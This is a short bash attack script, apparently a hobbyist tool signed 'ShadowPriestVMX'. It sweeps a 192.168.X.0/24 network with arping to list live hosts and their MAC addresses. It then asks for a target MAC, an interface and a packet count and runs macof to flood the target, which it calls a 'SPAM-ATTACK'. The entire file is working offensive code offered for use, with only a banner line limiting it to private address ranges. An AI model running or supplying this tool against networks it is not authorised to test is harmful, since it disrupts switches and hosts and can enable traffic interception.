#!/bin/bash
#MadeByShadowPriestVMX

clear
banner SetMacTxt


echo "_____________"
echo "|1.Sniff ARP.|"
echo "|2.Ctrl+C.   |"
echo "|3.Set Iface |"
echo "|4.Set MAC's |"
echo "|5.Set Speed |"
echo "-------------"

echo " __________________S_h_a_d_o_w_______P_r_i_e_s_t_______V_M_X________________________"
echo "======================================================================================="

sleep 4

echo "ATTACK ONLY 192.168.X.X NETWORKS"
echo " " 
echo "If you are attacking your ARP cache from Windows and arp -d doesn't work try --> netsh interface ip delete arpcache"
echo " "


sleep 1
read -p "192.168.(¿X?).1/24: " X

sleep 1

n=1
while [ $n -lt 255 ] 
do

A=`arping -c 1 192.168.$X.$n | grep "Timeout"`

if [[ $A == "Timeout" ]] ; then

sleep 0.0001

else 

echo "___________"
echo 192.168.$X.$n  
echo "^          |"
echo "|          |"
echo "|          |"
timeout 2 arping -c 1 192.168.$X.$n | cut -d" " -f4 | head -2
echo "___________"
echo ""
echo ""
fi

trap "echo STOPPED, READY FOR THE CHARGE!; break;" SIGINT SIGTERM

n=$(( $n + 1 ))

done

sleep 2

echo "_________________________________________________________________________________"
echo "================================================================================="

read -p "Set your MAC ADDRESS target: " mac
sleep 1
echo " "
ip a
echo ""
read -p "Set your Interface: " iface
sleep 1
echo " "
read -p "How many SPAM-ATTACK on your target: " spam
sleep 1
echo "SPARTANS.... ON YOUR POSITIONS ...."
echo ""
echo "GO!"
sleep 2
echo ""

macof -i $iface -n $spam -e $mac
